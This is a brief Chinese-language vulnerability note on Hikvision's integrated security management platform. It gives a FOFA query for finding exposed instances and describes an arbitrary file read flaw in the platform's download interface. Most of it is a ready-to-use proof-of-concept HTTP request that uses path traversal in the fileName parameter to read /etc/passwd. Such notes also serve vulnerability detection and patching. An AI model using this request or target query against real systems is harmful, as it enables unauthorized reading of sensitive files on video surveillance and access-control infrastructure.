**fofa**

```
product="HIKVISION-综合安防管理平台"
```

**一、漏洞简述**

海康威视综合安防管理平台涵盖了视频监控、报警系统、门禁系统等众多功能，实现了全方位的安防管理。具体功能有： 视频监控管理、实时视频查看、历史录像调取、 远程监控、报警系统、门禁系统。其接口download存在任意文件读取漏洞，攻击者可通过该漏洞获取操作系统敏感信息。

**二、漏洞检测poc**

```yaml
GET /center/api/task/..;/orgManage/v1/orgs/download?fileName=../../../../../../../etc/passwd HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36
```